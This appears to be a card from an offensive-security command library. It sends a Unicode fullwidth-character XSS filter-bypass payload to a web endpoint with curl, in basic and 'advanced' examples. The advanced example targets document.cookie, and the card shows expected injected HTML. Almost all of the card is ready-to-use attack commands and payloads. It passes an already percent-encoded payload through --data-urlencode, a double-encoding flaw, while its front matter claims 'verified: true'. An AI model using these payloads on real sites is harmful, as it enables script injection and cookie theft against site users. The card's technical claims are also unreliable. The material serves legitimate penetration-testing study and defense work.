---
type: command
executor: bash
data: >-
  curl -G "http://www.example.net/something" --data-urlencode
  "input=%CA%BA%EF%BC%9E%EF%BC%9Csvg onload=alert%28/XSS/%29%EF%BC%9E"
tags:
  - xss
  - unicode-bypass
  - testing
platforms:
  - linux
  - web-applications
verified: true
validated: true
---

# curl-test-unicode-xss-payload

## Command

```bash
curl -G "$_TARGET_URL" --data-urlencode "$_PAYLOAD"
```

## Description

This command tests a Unicode-encoded XSS payload against a web application's input endpoint using curl. It simulates a GET request with URL-encoded data to check if the filter bypass succeeds, allowing injection of script tags.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The vulnerable URL endpoint (e.g., http://www.example.net/something) | Yes |
| $_PAYLOAD | The Unicode-encoded XSS payload (e.g., %CA%BA%EF%BC%9E%EF%BC%9Csvg onload=alert%28/XSS/%29%EF%BC%9E) | Yes |
| -G | Treats data as query string parameters | Built-in |
| --data-urlencode | URL-encodes the payload to handle special characters | Built-in |

## Examples

### Basic Usage

```bash
curl -G "http://target.com/search" --data-urlencode "q=%CA%BA%EF%BC%9E%EF%BC%9Csvg onload=alert%28/XSS/%29%EF%BC%9E"
```

### Advanced Usage

```bash
curl -G "http://target.com/search" --data-urlencode "q=%CA%BA%EF%BC%9E%EF%BC%9Csvg onload=alert%28document.cookie%29%EF%BC%9E" -v
```

## Expected Output

A successful response might include the raw HTML with the injected <svg> tag intact, e.g.:

```
<html><body><input value="><svg onload=alert('XSS')>/>...</body></html>
```

If the bypass works, viewing the page in a browser would trigger the alert. Failed attempts show sanitized output or 403 errors.

## Related

- [[procedures/Unicode-Filter-Bypass-for-XSS]]
- [[codes/fullwidth-to-ascii-unicode-transformations]]
